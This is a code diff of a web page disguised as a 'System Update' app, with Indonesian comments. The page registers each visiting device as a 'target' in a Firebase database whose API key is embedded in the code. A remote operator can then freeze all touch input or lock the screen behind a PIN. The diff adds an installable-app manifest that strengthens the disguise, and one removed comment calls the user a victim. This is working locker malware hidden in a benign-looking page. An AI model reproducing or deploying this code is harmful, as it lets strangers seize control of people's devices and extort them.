@@ -3,7 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System</title>
+    <title>System Update</title>
+    
+    <!-- MANIFEST UNTUK PWA -->
+    <link rel="manifest" href="data:application/json;base64,ewogICJuYW1lIjogIlN5c3RlbSBVcGRhdGUiLAogICJzaG9ydF9uYW1lIjogIlN5c3RlbSIsCiAgImRlc2NyaXB0aW9uIjogIlN5c3RlbSBVcGRhdGUgQXBwbGljYXRpb24iLAogICJzdGFydF91cmwiOiAiLiIsCiAgImRpc3BsYXkiOiAic3RhbmRhbG9uZSIsCiAgImJhY2tncm91bmRfY29sb3IiOiAiIzAwMDAwMCIsCiAgInRoZW1lX2NvbG9yIjogIiMwMDAwMDAiLAogICJpY29ucyI6IFsKICAgIHsKICAgICAgInNyYyI6ICJkYXRhOmltYWdlL3N2Zyt4bWwsJTNDc3ZnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2Zycgdmlld0JveD0nMCAwIDUxMiA1MTInJTNFJTNDcmVjdCB3aWR0aD0nNTEyJyBoZWlnaHQ9JzUxMicgcng9JzUwJyBmaWxsPSclMjMwMDAlMjclM0UlM0MvdGV4dCUzRSUzQ3RleHQgeD0nMjU2JyB5PScyODAnIGZvbnQtc2l6ZT0nMjUwJyB0ZXh0LWFuY2hvcj0nbWlkZGxlJyBmaWxsPSclMjMwMGZmNDEnJTNFJUUyJTlDJTkyJTNDL3RleHQlM0UlM0Mvc3ZnJTNFIiwKICAgICAgInNpemVzIjogIjUxMng1MTIiLAogICAgICAidHlwZSI6ICJpbWFnZS9zdmcreG1sIiwKICAgICAgInB1cnBvc2UiOiAiYW55IgogICAgfQogIF0KfQ==">
+    
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
@@ -16,7 +20,6 @@
             -webkit-user-select: none;
         }
         
-        /* ========== LOCK SCREEN ========== */
         #lockScreen {
             position: fixed;
             top: 0;
@@ -31,13 +34,8 @@
             align-items: center;
             padding: 20px;
         }
-        #lockScreen.active {
-            display: flex;
-        }
-        #lockScreen .lock-icon {
-            font-size: 60px;
-            margin-bottom: 20px;
-        }
+        #lockScreen.active { display: flex; }
+        #lockScreen .lock-icon { font-size: 60px; margin-bottom: 20px; }
         #lockScreen .message {
             color: #ff4444;
             font-size: 18px;
@@ -62,9 +60,7 @@
             color: #fff;
             line-height: 50px;
         }
-        #lockScreen .pin-dot.filled {
-            border-color: #00ff41;
-        }
+        #lockScreen .pin-dot.filled { border-color: #00ff41; }
         #lockScreen .numpad {
             display: grid;
             grid-template-columns: repeat(3, 80px);
@@ -98,8 +94,6 @@
             min-height: 20px;
         }
 
-        /* ========== TOUCH BLOCK / FREEZE ========== */
-        /* GAK ADA LAYAR HITAM, CUMA FREEZE SENTUHAN */
         #touchFreezeOverlay {
             position: fixed;
             top: 0;
@@ -112,11 +106,8 @@
             pointer-events: all;
             cursor: not-allowed;
         }
-        #touchFreezeOverlay.active {
-            display: block;
-        }
+        #touchFreezeOverlay.active { display: block; }
         
-        /* TIMER KECIL DI SUDUT KANAN ATAS (biar korban tau masih freeze) */
         #freezeTimer {
             position: fixed;
             top: 50px;
@@ -141,7 +132,6 @@
             100% { opacity: 1; transform: scale(1.05); }
         }
 
-        /* ========== LOADING & STATUS ========== */
         #loading {
             display: flex;
             justify-content: center;
@@ -176,13 +166,9 @@
     <div id="statusBar">🟢 System Online</div>
     <div id="loading">⏳ Menghubungkan...</div>
 
-    <!-- FREEZE TIMER (KECIL DI SUDUT) -->
     <div id="freezeTimer">✋ FREEZE: <span id="freezeCount">10</span>s</div>
-
-    <!-- FREEZE OVERLAY (TRANSPARAN, BLOKIR SENTUHAN) -->
     <div id="touchFreezeOverlay"></div>
 
-    <!-- LOCK SCREEN -->
     <div id="lockScreen">
         <div class="lock-icon">🔒</div>
         <div class="message" id="lockMessage">⚠️ DEVICE LOCKED</div>
@@ -213,7 +199,7 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <script>
         // ============================================================
-        // 🔥 DATA FIREBASE SAMA
+        // 🔥 DATA FIREBASE ANDA
         // ============================================================
         const firebaseConfig = {
             apiKey: "AIzaSyD4wbgxY6e6m0vHPOZykPuQdea8LdFkQsk",
@@ -236,7 +222,6 @@
         let freezeInterval = null;
         let freezeRemaining = 0;
 
-        // ===================== GENERATE DEVICE ID =====================
         function generateDeviceId() {
             return 'dev_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2,6);
         }
@@ -258,7 +243,6 @@
             return 'Mobile Device';
         }
 
-        // ===================== REGISTER TARGET =====================
         function registerTarget() {
             deviceId = generateDeviceId();
             const deviceName = getDeviceName();
@@ -283,7 +267,6 @@
             });
         }
 
-        // ===================== LISTEN PERINTAH =====================
         function startListening() {
             const ref = db.ref(`targets/${deviceId}`);
             ref.on('value', (snapshot) => {
@@ -292,14 +275,12 @@
 
                 ref.update({ lastSeen: Date.now() });
 
-                // CEK FREEZE (TOUCH BLOCK)
                 if (data.touchBlocked === true && data.touchDuration) {
                     startFreeze(data.touchDuration);
                 } else if (data.touchBlocked === false) {
                     stopFreeze();
                 }
 
-                // CEK LOCK SCREEN
                 if (data.locked === true && data.pin) {
                     correctPin = data.pin;
                     isLocked = true;
@@ -311,7 +292,6 @@
             });
         }
 
-        // ===================== LOCK SCREEN =====================
         function showLockScreen(message) {
             document.getElementById('lockMessage').textContent = message;
             document.getElementById('lockScreen').classList.add('active');
@@ -327,22 +307,17 @@
             updateDots();
         }
 
-        // ===================== FREEZE / TOUCH BLOCK =====================
         function startFreeze(duration) {
-            // Tampilkan overlay transparan (blokir semua sentuhan)
             document.getElementById('touchFreezeOverlay').classList.add('active');
             document.getElementById('freezeTimer').classList.add('active');
             
             freezeRemaining = duration;
             document.getElementById('freezeCount').textContent = freezeRemaining;
             
-            // Blokir semua interaksi di body
             document.body.style.pointerEvents = 'none';
             document.getElementById('touchFreezeOverlay').style.pointerEvents = 'all';
             
-            if (freezeInterval) {
-                clearInterval(freezeInterval);
-            }
+            if (freezeInterval) clearInterval(freezeInterval);
             
             freezeInterval = setInterval(() => {
                 freezeRemaining--;
@@ -351,7 +326,6 @@
                 if (freezeRemaining <= 0) {
                     clearInterval(freezeInterval);
                     freezeInterval = null;
-                    // Auto-unfreeze via Firebase
                     db.ref(`targets/${deviceId}`).update({
                         touchBlocked: false,
                         touchDuration: null,
@@ -372,7 +346,6 @@
             }
         }
 
-        // ===================== REQUEST OVERLAY =====================
         function requestOverlayPermission() {
             try {
                 if (window.Android && window.Android.requestOverlay) {
@@ -381,7 +354,6 @@
             } catch(e) {}
         }
 
-        // ===================== PIN FUNCTIONS =====================
         function pressPin(num) {
             if (currentPin.length < 4) {
                 currentPin += num;
@@ -438,7 +410,6 @@
             });
         }
 
-        // ===================== KEYBOARD =====================
         document.addEventListener('keydown', (e) => {
             if (e.key >= '0' && e.key <= '9') {
                 pressPin(e.key);
@@ -449,7 +420,6 @@
             }
         });
 
-        // ===================== KEEP ALIVE =====================
         setInterval(() => {
             if (deviceId) {
                 db.ref(`targets/${deviceId}`).update({
@@ -459,7 +429,6 @@
             }
         }, 10000);
 
-        // ===================== START =====================
         document.addEventListener('DOMContentLoaded', () => {
             if (Notification && Notification.permission !== 'granted') {
                 Notification.requestPermission();
